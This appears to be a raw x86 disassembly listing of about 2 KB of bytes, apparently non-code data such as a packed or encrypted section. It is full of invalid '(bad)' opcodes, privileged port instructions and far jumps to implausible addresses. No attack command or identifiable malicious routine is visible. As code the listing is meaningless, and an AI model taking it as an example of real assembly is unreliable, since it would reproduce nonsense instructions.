  427b75:	enter  0x850,0xc4
  427b79:	fsubr  QWORD PTR [eax-0x3f56ba3e]
  427b7f:	icebp  
  427b80:	ds cld 
  427b82:	and    eax,0x1c6e8c70
  427b87:	fmul   st,st(1)
  427b89:	mov    al,0xaf
  427b8b:	cmp    DWORD PTR [ebx+0x203db16],edx
  427b91:	std    
  427b92:	mov    cl,0x63
  427b94:	fcmove st,st(7)
  427b96:	fs jo  0x427bbe
  427b99:	sahf   
  427b9a:	fcmovnu st,st(0)
  427b9c:	scas   al,BYTE PTR es:[edi]
  427b9d:	mov    BYTE PTR [esi-0x47783ff7],bh
  427ba3:	mov    cl,0xc6
  427ba5:	mov    eax,ds:0xc8930215
  427baa:	push   esp
  427bab:	aaa    
  427bac:	or     BYTE PTR [ecx-0x22],al
  427baf:	nop
  427bb0:	push   ds
  427bb1:	sbb    al,0xd2
  427bb3:	sub    ebp,DWORD PTR [edx-0x6c]
  427bb6:	add    BYTE PTR [edx+0x1b],dl
  427bb9:	and    DWORD PTR [edi-0x54],esp
  427bbc:	sar    ecx,1
  427bbe:	es mov eax,0xda11ea6c
  427bc4:	cmp    cl,ah
  427bc6:	das    
  427bc7:	ss jne 0x427c03
  427bca:	outs   dx,BYTE PTR ds:[esi]
  427bcb:	pop    ss
  427bcc:	test   al,0xd7
  427bce:	sbb    al,0xe3
  427bd0:	pop    edi
  427bd1:	cwde   
  427bd2:	mov    BYTE PTR [ebx-0x1ba59850],0x6
  427bd9:	jbe    0x427c07
  427bdb:	mov    edi,0x40e79497
  427be0:	jp     0x427b6c
  427be2:	ret    
  427be3:	or     cl,BYTE PTR [ebx+0x68]
  427be6:	repnz xchg edx,eax
  427be8:	leave  
  427be9:	xchg   edx,eax
  427bea:	push   0xffffffed
  427bec:	cs xor esi,DWORD PTR gs:[eax]
  427bf0:	ins    DWORD PTR es:[edi],dx
  427bf1:	jno    0x427b7a
  427bf3:	xor    eax,0x78250908
  427bf8:	sahf   
  427bf9:	bound  ebx,QWORD PTR [ebx-0x2aa0a4c0]
  427bff:	jno    0x427baf
  427c01:	and    al,0xb8
  427c03:	sub    BYTE PTR [ebp+0x22],ch
  427c06:	and    BYTE PTR [esi-0x23],ah
  427c09:	and    dh,BYTE PTR [eax+0x4b]
  427c0c:	popa   
  427c0d:	inc    DWORD PTR ds:0x22cc1cbc
  427c13:	fidiv  DWORD PTR [eax]
  427c15:	xchg   edx,eax
  427c16:	into   
  427c17:	mov    edi,DWORD PTR [edi-0x1d982fe9]
  427c1d:	cmp    dh,ch
  427c1f:	(bad)  
  427c20:	mov    edx,0x76f10b0d
  427c25:	xor    edi,DWORD PTR [edi+eiz*4+0x54]
  427c29:	push   esp
  427c2a:	or     eax,0x75713f4d
  427c2f:	hlt    
  427c30:	repnz and dh,BYTE PTR [edi]
  427c33:	lods   al,BYTE PTR ds:[esi]
  427c34:	mov    es:0x2eb89f7a,eax
  427c3a:	xlat   BYTE PTR ds:[ebx]
  427c3b:	dec    ebx
  427c3c:	or     DWORD PTR [eax+0x17d49a1e],ebx
  427c42:	test   al,0xd4
  427c44:	cld    
  427c45:	shl    ch,cl
  427c47:	mov    al,0xea
  427c49:	sub    dl,BYTE PTR [edx+0x454698b3]
  427c4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c50:	push   ss
  427c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c52:	add    BYTE PTR [ecx-0x5c],0x74
  427c56:	mov    edi,0xb7f846ec
  427c5b:	popf   
  427c5c:	mov    edx,edx
  427c5e:	adc    eax,0x889af610
  427c63:	adc    dl,BYTE PTR [eax-0xb8d9379]
  427c69:	int3   
  427c6a:	or     esp,ecx
  427c6c:	jecxz  0x427c6f
  427c6e:	mov    ch,0x9
  427c70:	jecxz  0x427cdb
  427c72:	inc    esp
  427c73:	nop
  427c74:	xor    al,0x7e
  427c76:	jp     0x427c22
  427c78:	call   0xccbbbcef
  427c7d:	aam    0x37
  427c7f:	stos   DWORD PTR es:[edi],eax
  427c80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c81:	adc    BYTE PTR [edx-0x5d],0x1d
  427c85:	gs out 0x42,al
  427c88:	xor    al,0xd0
  427c8a:	pusha  
  427c8b:	in     al,0xe3
  427c8d:	adc    bh,BYTE PTR [edx]
  427c8f:	xor    bl,0xc7
  427c92:	jecxz  0x427c46
  427c94:	das    
  427c95:	pop    ecx
  427c96:	icebp  
  427c97:	or     esi,DWORD PTR [ecx]
  427c99:	push   esi
  427c9a:	push   edx
  427c9b:	xlat   BYTE PTR ds:[ebx]
  427c9c:	xchg   edi,eax
  427c9d:	push   esi
  427c9e:	dec    esi
  427c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ca0:	pop    eax
  427ca1:	cmp    bl,BYTE PTR [esi]
  427ca3:	push   esi
  427ca4:	pop    esp
  427ca5:	lods   eax,DWORD PTR ds:[esi]
  427ca6:	and    ebx,DWORD PTR [ebp-0x6933599a]
  427cac:	popf   
  427cad:	xchg   edi,eax
  427cae:	pop    es
  427caf:	xchg   edx,eax
  427cb0:	xlat   BYTE PTR ds:[ebx]
  427cb1:	or     al,0x14
  427cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cb4:	fs (bad) 
  427cb6:	ins    DWORD PTR es:[edi],dx
  427cb7:	inc    edi
  427cb8:	mov    esp,0xfacb4e65
  427cbd:	popa   
  427cbe:	push   ss
  427cbf:	dec    edx
  427cc0:	mov    ds:0x340c5024,eax
  427cc5:	bound  ebx,QWORD PTR [edx+0x71587f9]
  427ccb:	lea    ebx,[esi+0x66]
  427cce:	and    DWORD PTR [edx],esi
  427cd0:	add    esi,esp
  427cd2:	inc    esi
  427cd3:	sub    eax,0xa33f8044
  427cd8:	jno    0x427cbc
  427cda:	or     eax,0x910cb35d
  427cdf:	ja     0x427c76
  427ce1:	daa    
  427ce2:	call   0xdb6d490b
  427ce7:	sbb    ebp,DWORD PTR [edi+0x48]
  427cea:	stc    
  427ceb:	lock xchg ebp,eax
	...
  427cf9:	add    BYTE PTR [ebx],bl
  427cfb:	daa    
  427cfc:	pushf  
  427cfd:	cli    
  427cfe:	mov    esp,0xaae77ffb
  427d03:	xchg   esp,eax
  427d04:	out    dx,eax
  427d05:	cdq    
  427d06:	pop    edx
  427d07:	dec    esp
  427d08:	inc    eax
  427d09:	js     0x427cfb
  427d0b:	icebp  
  427d0c:	add    DWORD PTR [eax],eax
  427d0e:	sti    
  427d0f:	add    DWORD PTR [eax],eax
  427d11:	add    BYTE PTR [ebx],dh
  427d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d14:	arpl   WORD PTR [ebp+0x1f],cx
  427d17:	xor    al,0x2e
  427d19:	mov    bh,0xd7
  427d1b:	int    0xe5
  427d1d:	xchg   edi,eax
  427d1e:	std    
  427d1f:	enter  0xc9f6,0xa
  427d23:	scas   eax,DWORD PTR es:[edi]
  427d24:	call   DWORD PTR [ebx-0x60]
  427d27:	mov    DWORD PTR [edx+0x538f0491],eax
  427d2d:	out    dx,eax
  427d2e:	lods   eax,DWORD PTR ds:[esi]
  427d2f:	mov    al,ds:0x56ff72b5
  427d34:	out    0x93,al
  427d36:	repnz dec esp
  427d38:	push   ebx
  427d39:	push   eax
  427d3a:	in     al,0x39
  427d3c:	lods   al,BYTE PTR ds:[esi]
  427d3d:	mov    BYTE PTR [ebp+eiz*8-0x14],dl
  427d41:	mov    eax,ds:0x999c715f
  427d46:	cmp    al,0x18
  427d48:	xor    esi,ecx
  427d4a:	or     eax,0xbb98ce50
  427d4f:	xlat   BYTE PTR ds:[ebx]
  427d50:	add    edi,DWORD PTR [edx+ecx*4]
  427d53:	test   BYTE PTR [esi],0xae
  427d56:	daa    
  427d57:	retf   
  427d58:	xchg   ebx,eax
  427d59:	into   
  427d5a:	or     ebx,DWORD PTR ds:0x2dbce58d
  427d60:	retf   
  427d61:	les    edi,FWORD PTR [esi]
  427d63:	sbb    al,0x1
  427d65:	or     ebp,esi
  427d67:	cmp    BYTE PTR [edx],dl
  427d69:	adc    al,0xc2
  427d6b:	mov    BYTE PTR ds:0x535cf8bc,ah
  427d71:	sbb    al,0x7d
  427d73:	mov    BYTE PTR [esi],al
  427d75:	and    BYTE PTR [ecx+0x2fbd463d],dh
  427d7b:	(bad)  
  427d7c:	in     eax,0xf1
  427d7e:	fild   QWORD PTR ds:0x4fd763b0
  427d84:	data16 sbb dl,dl
  427d87:	popa   
  427d88:	hlt    
  427d89:	xor    esp,DWORD PTR ds:[bp+di+0x66]
  427d8e:	out    0x82,eax
  427d90:	xchg   BYTE PTR [edi-0x674e6dd6],al
  427d96:	xor    al,0x2c
  427d98:	xchg   ebx,eax
  427d99:	sbb    bh,BYTE PTR [edx]
  427d9b:	jge    0x427d82
  427d9d:	in     eax,0xea
  427d9f:	fadd   st,st(1)
  427da1:	hlt    
  427da2:	xchg   edi,eax
  427da3:	sub    DWORD PTR [esi-0x34],0x272ba543
  427daa:	mov    dh,0x3c
  427dac:	jmp    0x102a75e9
  427db1:	sub    eax,0x31a62cd0
  427db6:	mov    dl,0x9
  427db8:	pop    edx
  427db9:	add    dh,BYTE PTR ds:0xb262011
  427dbf:	pop    eax
  427dc0:	aam    0x1f
  427dc2:	sysret 
  427dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427dc5:	xchg   edi,eax
  427dc6:	call   0xe03:0xf1968105
  427dcd:	cmc    
  427dce:	scas   al,BYTE PTR es:[edi]
  427dcf:	pop    es
  427dd0:	or     edi,DWORD PTR [edi+0x710b30b8]
  427dd6:	nop
  427dd7:	fstp   DWORD PTR [eax]
  427dd9:	fimul  DWORD PTR [ebx]
  427ddb:	in     al,0x8a
  427ddd:	inc    eax
  427dde:	add    DWORD PTR [eax+0x7b],edi
  427de1:	xlat   BYTE PTR ds:[ebx]
  427de2:	test   al,0x92
  427de4:	loop   0x427dd8
  427de6:	stc    
  427de7:	dec    ebp
  427de8:	inc    ecx
  427de9:	(bad)  
  427dea:	in     al,dx
  427deb:	loop   0x427df7
  427ded:	cmp    DWORD PTR [edx+0x3ec8dbc6],esi
  427df3:	out    0xbc,eax
  427df5:	fbld   TBYTE PTR [eax+0x3809510d]
  427dfb:	test   DWORD PTR [ebx+0x15c2d4bb],esp
  427e01:	dec    ebx
  427e02:	jle    0x427dcb
  427e04:	shr    BYTE PTR [edi-0x18],cl
  427e07:	repz js 0x427db8
  427e0a:	add    cl,dh
  427e0c:	gs loope 0x427dbd
  427e0f:	xchg   BYTE PTR [esi+0x3f],dh
  427e12:	pop    esi
  427e13:	(bad)  
  427e14:	fisttp DWORD PTR [edi+0x3c]
  427e17:	push   0x1d
  427e19:	inc    ebx
  427e1a:	ins    BYTE PTR es:[edi],dx
  427e1b:	adc    esi,DWORD PTR [ecx]
  427e1d:	fs pushf 
  427e1f:	jnp    0x427e4b
  427e21:	(bad)  
  427e22:	dec    esi
  427e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e24:	xchg   ecx,eax
  427e25:	out    dx,eax
  427e26:	sbb    BYTE PTR [ebx],cl
  427e28:	es pop esi
  427e2a:	xor    al,0x95
  427e2c:	aaa    
  427e2d:	fsubr  QWORD PTR [edx]
  427e2f:	test   cl,dl
  427e31:	sbb    DWORD PTR [eax+0x455f6b72],esi
  427e37:	push   edi
  427e38:	sub    BYTE PTR [ebx],cl
  427e3a:	xchg   ebx,eax
  427e3b:	add    edx,DWORD PTR [edi]
  427e3d:	dec    edi
  427e3e:	xor    BYTE PTR [ecx+0x1d75ccc4],cl
  427e44:	jo     0x427e79
  427e46:	inc    edi
  427e47:	icebp  
  427e48:	inc    eax
  427e49:	push   0x1c
  427e4b:	cld    
  427e4c:	cmp    dl,BYTE PTR [edx+0x6309d5c4]
  427e52:	pop    esp
  427e53:	lock call 0xd6f0:0xcc984362
  427e5b:	daa    
  427e5c:	xor    al,BYTE PTR [edx-0x44e504d8]
  427e62:	mov    bl,0x4e
  427e64:	hlt    
  427e65:	jmp    0x427eac
  427e67:	popf   
  427e68:	or     al,0xfb
  427e6a:	push   esp
  427e6b:	pop    ecx
  427e6c:	xor    dh,BYTE PTR [ebx+0x1e]
  427e6f:	mov    edx,DWORD PTR [eax+0x3890c1c7]
  427e75:	cmc    
  427e76:	mov    cl,0x8e
  427e78:	sub    ch,BYTE PTR [eax-0x3ccc01cb]
  427e7e:	std    
  427e7f:	pop    edx
  427e80:	fdivr  st,st(7)
  427e82:	dec    esi
  427e83:	dec    ebx
  427e84:	dec    ebp
  427e85:	pop    es
  427e86:	hlt    
  427e87:	cmp    DWORD PTR [edi],0x2
  427e8a:	mov    dl,0xfd
  427e8c:	adc    ebp,DWORD PTR [esi-0x14]
  427e8f:	xchg   esp,eax
  427e90:	jmp    0x427eec
  427e92:	ja     0x427e47
  427e94:	icebp  
  427e95:	in     al,dx
  427e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e97:	adc    DWORD PTR [esp+edx*2+0x5b],ecx
  427e9b:	add    DWORD PTR [ecx],0xffffffc2
  427e9e:	pop    ebx
  427e9f:	call   0x5fa2:0xeac867cb
  427ea6:	imul   edx,DWORD PTR [ebp+0x6faf4301],0xd
  427ead:	rcr    DWORD PTR ds:0x9fc87e92,cl
  427eb3:	sbb    ah,BYTE PTR [ecx+0x569d56db]
  427eb9:	and    eax,0x37aad4b7
  427ebe:	xchg   ecx,eax
  427ebf:	mov    ecx,0x98fcef9
  427ec4:	jp     0x427ee0
  427ec6:	(bad)  
  427ec7:	and    al,0x35
  427ec9:	adc    dl,ah
  427ecb:	retf   
  427ecc:	aaa    
  427ecd:	jno    0x427ee6
  427ecf:	in     eax,0x30
  427ed1:	scas   al,BYTE PTR es:[edi]
  427ed2:	cmc    
  427ed3:	dec    esi
  427ed4:	es add eax,0x8a19f55b
  427eda:	mov    edx,0x238c8580
  427edf:	xchg   ebp,eax
  427ee0:	xchg   ecx,eax
  427ee1:	(bad)  
  427ee2:	mov    BYTE PTR [ebp+0x1c],cl
  427ee5:	push   0x1c
  427ee7:	pop    ds
  427ee8:	ds and edi,0xfffffff2
  427eec:	pop    ecx
  427eed:	enter  0xcf8e,0xe5
  427ef1:	ja     0x427ed1
  427ef3:	dec    edx
  427ef4:	jns    0x427f39
  427ef6:	mov    WORD PTR [ecx+ebx*8+0x41944c96],ds
  427efd:	imul   ecx,DWORD PTR [ecx+0x24],0x1
  427f01:	test   al,0xad
  427f03:	add    ecx,DWORD PTR [edx]
  427f05:	and    bl,BYTE PTR ds:0xa50eb358
  427f0b:	xchg   ecx,eax
  427f0c:	retf   0x0
	...
  427f17:	add    BYTE PTR [eax],al
  427f19:	add    BYTE PTR [edx-0x107ddbc],bl
  427f1f:	(bad)  
  427f20:	fisub  DWORD PTR [esi-0x37]
  427f23:	and    dh,BYTE PTR [ecx+edx*1+0xb]
  427f27:	lock aaa 
  427f29:	cwde   
  427f2a:	jmp    0x427f1f
  427f2c:	add    DWORD PTR [eax],eax
  427f2e:	sti    
  427f2f:	add    DWORD PTR [eax],eax
  427f31:	add    ch,al
  427f33:	pop    ecx
  427f34:	cmp    ch,BYTE PTR [edi-0x4cb74561]
  427f3a:	xor    BYTE PTR [ebx+eax*1-0x6a],dh
  427f3e:	hlt    
  427f3f:	inc    ebx
  427f40:	jo     0x427f4a
  427f42:	jns    0x427f75
  427f44:	dec    edi
  427f45:	test   DWORD PTR [esi],eax
  427f47:	fmul   QWORD PTR [ecx+0x22]
  427f4a:	fsub   QWORD PTR [ebp+ebp*4-0x2a314441]
  427f51:	add    al,0xdb
  427f53:	in     eax,dx
  427f54:	jne    0x427f53
  427f56:	jb     0x427f94
  427f58:	mov    eax,ds:0xe92251f8
  427f5d:	adc    ebp,DWORD PTR ds:0xed744586
  427f63:	in     al,dx
  427f64:	dec    ch
  427f66:	sub    eax,0x4a023d44
  427f6b:	pop    edi
  427f6c:	outs   dx,DWORD PTR ds:[esi]
  427f6d:	aaa    
  427f6e:	sub    al,0x28
  427f70:	ja     0x427f62
  427f72:	ficomp DWORD PTR [edi-0x3d]
  427f75:	and    eax,0x411064b7
  427f7a:	mov    dh,0xe5
  427f7c:	mov    dh,0xe9
  427f7e:	outs   dx,DWORD PTR ds:[esi]
  427f7f:	or     al,0x7c
  427f81:	jge    0x427fb6
  427f83:	test   eax,0x6101b578
  427f88:	pop    esp
  427f89:	in     eax,0xf7
  427f8b:	sbb    BYTE PTR [ecx-0x5e],bl
  427f8e:	adc    DWORD PTR [ebx],eax
  427f90:	and    eax,0x85a6691c
  427f95:	call   0x80d0:0xb2b6a3db
  427f9c:	out    0xbe,al
  427f9e:	add    esp,DWORD PTR [edi+edx*4-0x69]
  427fa2:	inc    edx
  427fa3:	push   edx
  427fa4:	imul   edx,DWORD PTR [edx-0x4efcbbad],0xf9bca905
  427fae:	enter  0x8330,0x5c
  427fb2:	xor    BYTE PTR [ebx+0x51f9f4d2],bl
  427fb8:	pop    es
  427fb9:	imul   ebp,DWORD PTR [esi-0x342afe94],0x66f00eee
  427fc3:	xor    DWORD PTR [esi+0x2b],ecx
  427fc6:	outs   dx,DWORD PTR ds:[esi]
  427fc7:	push   eax
  427fc8:	mov    cl,0xd9
  427fca:	push   ss
  427fcb:	cmp    BYTE PTR [ebp-0x29],0x44
  427fcf:	sub    al,0x39
  427fd1:	xchg   ebp,eax
  427fd2:	mov    esi,0xbaf500ca
  427fd7:	add    ebx,DWORD PTR [esi]
  427fd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fda:	shl    DWORD PTR [ecx+0x3981bd9b],1
  427fe0:	aas    
  427fe1:	dec    ebp
  427fe2:	mov    ss,WORD PTR [eax]
  427fe4:	bound  esp,QWORD PTR [esi+edx*4+0x42026d03]
  427feb:	les    ebp,FWORD PTR [esi-0x36]
  427fee:	out    0x51,al
  427ff0:	and    bl,dh
  427ff2:	pop    ecx
  427ff3:	add    ch,BYTE PTR [ebx+0x6dd73c89]
  427ff9:	mov    WORD PTR [eax+0x6d],fs
  427ffc:	dec    edi
  427ffd:	push   ss
  427ffe:	aad    0x8b
  428000:	adc    eax,0x8346057f
  428005:	fcmovu st,st(0)
  428007:	sbb    BYTE PTR [ebp+0x6],0xa0
  42800b:	cmp    al,0xbe
  42800d:	pop    ebx
  42800e:	mov    al,ds:0xff04e4e5
  428013:	push   ss
  428014:	cmp    BYTE PTR [ebx-0x40],cl
  428017:	(bad)  
  428019:	or     al,0x58
  42801b:	jbe    0x427fe9
  42801d:	push   eax
  42801e:	push   fs
  428020:	xlat   BYTE PTR ds:[ebx]
  428021:	xchg   ecx,eax
  428022:	ins    DWORD PTR es:[edi],dx
  428023:	pop    ebx
  428024:	repnz (bad) [ebp-0x32b32bae]
  42802b:	xchg   ch,bh
  42802d:	adc    BYTE PTR [eax],bh
  42802f:	mov    edi,0xf5c2703d
  428034:	push   edi
  428035:	fs jnp 0x42801d
  428038:	out    dx,al
  428039:	iret   
  42803a:	inc    ebx
  42803b:	in     al,0xb4
  42803d:	xchg   si,ax
  42803f:	pop    ebp
  428040:	pop    es
  428041:	pop    esi
  428042:	jle    0x42802c
  428044:	add    edx,DWORD PTR [esi-0x7f]
  428047:	call   0xc7ae156c
  42804c:	xchg   edx,eax
  42804d:	hlt    
  42804e:	ret    0x4d98
  428051:	mov    dh,0x50
  428053:	pop    es
  428054:	lods   al,BYTE PTR ds:[esi]
  428055:	jecxz  0x4280c9
  428057:	sbb    ah,BYTE PTR [esi+eax*8]
  42805a:	dec    ebp
  42805b:	pop    ebx
  42805c:	xchg   DWORD PTR [ecx+0x620618e1],edx
  428062:	fmul   QWORD PTR [eax-0x5d55a85a]
  428068:	fisub  DWORD PTR [ebx]
  42806a:	mov    al,ds:0xce44bb3d
  42806f:	es push eax
  428071:	push   edx
  428072:	and    dl,dl
  428074:	sbb    al,0xc0
  428076:	sbb    DWORD PTR [ebx-0x176f3390],eax
  42807c:	out    dx,eax
  42807d:	test   BYTE PTR [eax+eax*2-0x38],ch
  428081:	outs   dx,DWORD PTR ds:[esi]
  428082:	sbb    al,0xfb
  428084:	inc    esp
  428085:	jmp    0xd32b:0x97646322
  42808c:	and    al,0xf4
  42808e:	stc    
  42808f:	ficom  WORD PTR [ebx+0x40]
  428092:	fcos   
  428094:	jecxz  0x42802d
  428096:	xor    ebx,eax
  428098:	je     0x428044
  42809a:	iret   
  42809b:	sub    eax,0x5d3e5582
  4280a0:	sbb    ah,BYTE PTR ds:0xc1d0b4e7
  4280a6:	xchg   BYTE PTR fs:[ecx+0x46f61ccf],ah
  4280ad:	push   esp
  4280ae:	add    BYTE PTR [edi+0x50a6c486],ah
  4280b4:	jge    0x4280cb
  4280b6:	ds push ds
  4280b8:	(bad)
  4280bb:	pop    ss
  4280bc:	cmp    al,bl
  4280be:	outs   dx,DWORD PTR ds:[esi]
  4280bf:	mov    cl,0x8e
  4280c1:	and    al,0x6e
  4280c3:	sub    edx,DWORD PTR [edi+0x6ce46900]
  4280c9:	sbb    eax,0xe8619c3c
  4280ce:	add    BYTE PTR [esi+ebp*2+0x6b110530],0x7a
  4280d6:	dec    ebp
  4280d7:	xor    ebx,DWORD PTR [ebp-0x48]
  4280da:	sbb    eax,0x397212fd
  4280df:	cmp    esi,DWORD PTR ds:0x4198677d
  4280e5:	xor    al,BYTE PTR [edi+eax*4+0x6df97ed5]
  4280ec:	ja     0x4280d4
  4280ee:	mov    ebx,0x3bb79c17
  4280f3:	mov    WORD PTR [ebx+edx*8-0x25],es
  4280f7:	out    0x40,al
  4280f9:	add    eax,0xf3beef7e
  4280fe:	call   DWORD PTR [ebx]
  428100:	scas   al,BYTE PTR es:[edi]
  428101:	popa   
  428102:	sbb    DWORD PTR [esi-0x76b0a5ae],ecx
  428108:	xchg   ebp,eax
  428109:	iret   
  42810a:	shl    DWORD PTR [ebx+esi*1],cl
  42810d:	mov    dh,cl
  42810f:	push   cs
  428110:	retf   0x155b
  428113:	jnp    0x4280b8
  428115:	scas   al,BYTE PTR es:[edi]
  428116:	push   ebx
  428117:	pop    ebp
  428118:	ds jb  0x428174
  42811b:	jmp    0x91a3:0x534e5b09
  428122:	jmp    0xbb2ea734
  428127:	(bad)  
  428128:	out    0xdc,al
  42812a:	mov    eax,0xd9c8
	...
  428137:	add    BYTE PTR [eax],al
  428139:	add    BYTE PTR [eax+0x3fc326ab],dl
  42813f:	iret   
  428140:	cmc    
  428141:	sti    
  428142:	pushf  
  428143:	and    al,0x28
  428145:	push   ebp
  428146:	and    BYTE PTR [edx-0xa19acfc],0x1
  42814d:	add    bl,bh
  42814f:	add    DWORD PTR [eax],eax
  428151:	add    BYTE PTR [ecx],cl
  428153:	loopne 0x4281a4
  428155:	jp     0x428164
  428157:	test   al,0x9d
  428159:	inc    ebx
  42815a:	mov    al,0xec
  42815c:	or     al,0x87
  42815e:	and    al,BYTE PTR [ebx-0x39ad5b83]
  428164:	jmp    0x42819e
  428166:	jmp    0xf162d00d
  42816b:	ror    BYTE PTR [edi-0x4],0x5c
  42816f:	outs   dx,BYTE PTR ds:[esi]
  428170:	push   ss
  428171:	pop    esp
  428172:	add    al,0x7
  428174:	repnz add DWORD PTR [edi],ecx
  428177:	jb     0x4280fb
  428179:	rol    DWORD PTR [ecx+ecx*2-0x80],1
  42817d:	pop    ebp
  42817e:	jecxz  0x428155
  428180:	push   0x8f7124bb
  428185:	pop    ebp
  428186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428187:	pop    ecx
  428188:	in     al,dx
  428189:	lea    esp,[eax]
  42818b:	cmp    al,0xea
  42818d:	push   eax
  42818e:	sub    DWORD PTR [edi+0x5a130b9b],0xffffff81
  428195:	iret   
  428196:	or     eax,0x1fd0bd20
  42819b:	jecxz  0x42818e
  42819d:	clc    
  42819e:	dec    edi
  42819f:	jnp    0x4281db
  4281a1:	daa    
  4281a2:	lods   eax,DWORD PTR ds:[esi]
  4281a3:	je     0x428206
  4281a5:	call   0x47106333
  4281aa:	lahf   
  4281ab:	mov    ch,0x6f
  4281ad:	retf   
  4281ae:	xchg   ecx,edi
  4281b0:	jo     0x4281ea
  4281b2:	cli    
  4281b3:	stos   BYTE PTR es:[edi],al
  4281b4:	in     eax,dx
  4281b5:	push   ebx
  4281b6:	popf   
  4281b7:	dec    ebx
  4281b8:	mov    cl,0x9a
  4281ba:	mov    ds:0x4271e9ef,eax
  4281bf:	lea    edx,[eax]
  4281c1:	fs mov ah,0x44
  4281c4:	ror    BYTE PTR [eax-0x43237be],cl
  4281ca:	arpl   di,dx
  4281cc:	push   eax
  4281cd:	inc    esi
  4281ce:	scas   al,BYTE PTR es:[edi]
  4281cf:	adc    DWORD PTR [edx-0xf3a7f45],edi
  4281d5:	call   DWORD PTR [ebx]
  4281d7:	pop    edi
  4281d8:	jnp    0x42820a
  4281da:	mov    ch,0x91
  4281dc:	pop    ds
  4281dd:	mov    dh,0x48
  4281df:	sbb    ebp,ebx
  4281e1:	cwde   
  4281e2:	iret   
  4281e3:	imul   DWORD PTR ds:0xce5aac2c
  4281e9:	dec    ebp
  4281ea:	fild   DWORD PTR [edi+0x6e]
  4281ed:	(bad)  
  4281ef:	lahf   
  4281f0:	js     0x4281e3
  4281f2:	jg     0x428205
  4281f4:	bswap  ebp
  4281f6:	call   ebx
  4281f8:	mov    esi,0xc7e656ab
  4281fd:	shl    ebp,cl
  4281ff:	aaa    
  428200:	enter  0xcd4f,0x9c
  428204:	mov    ch,0xd9
  428206:	test   al,0x88
  428208:	retf   
  428209:	js     0x42826d
  42820b:	addr16 jmp 0x7fad7454
  428211:	xchg   DWORD PTR [ebx],ebx
  428213:	jmp    0x42826b
  428215:	adc    ecx,DWORD PTR ds:0xc2c12e4b
  42821b:	cmp    al,0xac
  42821d:	stos   BYTE PTR es:[edi],al
  42821e:	cmp    edi,edx
  428220:	jp     0x4281cd
  428222:	std    
  428223:	push   ecx
  428224:	jb     0x42827d
  428226:	cli    
  428227:	push   es
  428228:	fcmovnbe st,st(0)
  42822a:	dec    esi
  42822b:	mov    eax,ds:0x8185d13a
  428230:	xchg   edx,eax
  428231:	mov    ecx,0x4e577167
  428236:	push   ss
  428237:	mov    edx,0x24bcf8d5
  42823c:	dec    esp
  42823d:	out    dx,eax
  42823e:	jo     0x4281f8
  428240:	add    al,0x25
  428242:	push   cs
  428243:	xchg   ebp,eax
  428244:	jp     0x4282ab
  428246:	sar    DWORD PTR [ecx-0x7d658050],1
  42824c:	sar    BYTE PTR ds:0x526ecd4e,1
  428252:	jmp    0x7a8b:0xd65ba896
  428259:	jnp    0x428206
  42825b:	jp     0x42822c
  42825d:	sub    ah,dl
  42825f:	arpl   dx,cx
  428261:	dec    ebx
  428262:	cmp    ebx,DWORD PTR fs:[ecx-0x2689583e]
  428269:	shl    DWORD PTR [esi+edx*8-0x3a],0x4d
  42826e:	jo     0x4282b3
  428270:	push   0x58580c00
  428275:	fld    DWORD PTR [esi-0x8]
  428278:	xchg   bl,ah
  42827a:	adc    edi,ebx
  42827c:	mov    bh,0x5a
  42827e:	push   es
  42827f:	gs push edi
  428281:	cmp    al,0xfa
  428283:	jnp    0x4282ac
  428285:	test   DWORD PTR [edi],eax
  428287:	xchg   ecx,eax
  428288:	fdivr  DWORD PTR [edi-0x65]
  42828b:	test   eax,0x512af962
  428290:	in     eax,dx
  428291:	jp     0x428305
  428293:	into   
  428294:	adc    BYTE PTR [esi],bh
  428296:	mov    edi,0xd95b6361
  42829b:	dec    edx
  42829c:	sbb    al,0xb1
  42829e:	and    dh,BYTE PTR [edi-0x1db7b13b]
  4282a4:	imul   eax,DWORD PTR [eax+0x21b3f2eb],0x45
  4282ab:	cmp    ebp,DWORD PTR [ecx-0x61]
  4282ae:	enter  0xe53b,0x4e
  4282b2:	mov    ss,WORD PTR [eiz*2+0x2e5ef1b0]
  4282b9:	adc    al,0x3
  4282bb:	lods   eax,DWORD PTR gs:[esi]
  4282bd:	push   ebp
  4282be:	jae    0x428271
  4282c0:	loopne 0x4282ad
  4282c2:	inc    edx
  4282c3:	lea    edi,es:[ebx+0x3e]
  4282c7:	loopne 0x42833c
  4282c9:	mov    ah,0xbf
  4282cb:	sbb    BYTE PTR [edx+0x6e7904b],dl
  4282d1:	aas    
  4282d2:	popf   
  4282d3:	pop    edi
  4282d4:	std    
  4282d5:	jmp    0x3345:0xeb54750e
  4282dc:	fadd   DWORD PTR [ebp+edi*8+0x232e9f66]
  4282e3:	or     BYTE PTR [edi],0xf6
  4282e6:	ret    
  4282e7:	mov    al,0x48
  4282e9:	push   ebp
  4282ea:	cwde   
  4282eb:	aam    0xe6
  4282ed:	ins    DWORD PTR es:[edi],dx
  4282ee:	mov    WORD PTR [eax],?
  4282f0:	test   esp,eax
  4282f2:	cs (bad) 
  4282f4:	lds    esp,FWORD PTR [edi]
  4282f6:	iret   
  4282f7:	xor    eax,esp
  4282f9:	(bad)  
  4282fa:	xlat   BYTE PTR ds:[ebx]
  4282fb:	rcl    BYTE PTR [eax-0x499b7ae7],0x1f
  428302:	and    esi,DWORD PTR [eax]
  428304:	fisubr DWORD PTR [ebp+0x17]
  428307:	mov    al,0xb
  428309:	xchg   DWORD PTR [edi+0x404b30bc],esp
  42830f:	ror    DWORD PTR [edi-0x5225a2b7],0x26
  428316:	pushf  
  428317:	cmp    dh,BYTE PTR [eax+0x67e3cab5]
  42831d:	xor    ah,ah
  42831f:	cmp    ah,BYTE PTR [ebx+0x2535b9ae]
  428325:	adc    ch,BYTE PTR [eax+eiz*8+0x1f]
  428329:	dec    esp
  42832a:	mov    dl,0x35
  42832c:	fs fcomp st(6)
  42832f:	cmp    cl,ah
